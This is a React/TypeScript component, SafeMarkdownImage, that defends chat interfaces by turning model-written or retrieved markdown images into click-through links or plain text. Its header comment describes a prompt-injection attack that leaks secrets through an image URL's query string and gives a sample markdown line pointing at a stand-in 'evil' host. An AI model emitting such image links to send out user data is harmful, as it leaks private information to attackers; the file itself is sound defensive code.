import React from 'react';

/**
 * SECURITY (GOO-636): markdown written by the model, or copied from retrieved
 * documents, is untrusted. A plain `<img>` makes the browser fetch an
 * attacker-chosen URL as soon as the message renders, so a prompt injection
 * can leak data through the query string (`![](https://evil/?q=<secret>)`).
 *
 * Never render the image. An absolute http(s) source becomes a link the
 * reader has to click; anything else is shown as text only.
 */
export function SafeMarkdownImage({
  src,
  alt,
}: {
  src?: unknown;
  alt?: string;
}): React.ReactElement {
  const label = alt ? `[image: ${alt}]` : '[image]';
  const href = typeof src === 'string' ? safeHttpUrl(src) : null;
  if (!href) return <span>{label}</span>;
  return (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer nofollow"
      referrerPolicy="no-referrer"
      title={`Open image: ${href}`}
      className="underline"
    >
      {label}
    </a>
  );
}

function safeHttpUrl(src: string): string | null {
  try {
    const url = new URL(src);
    return url.protocol === 'https:' || url.protocol === 'http:'
      ? url.href
      : null;
  } catch {
    return null;
  }
}
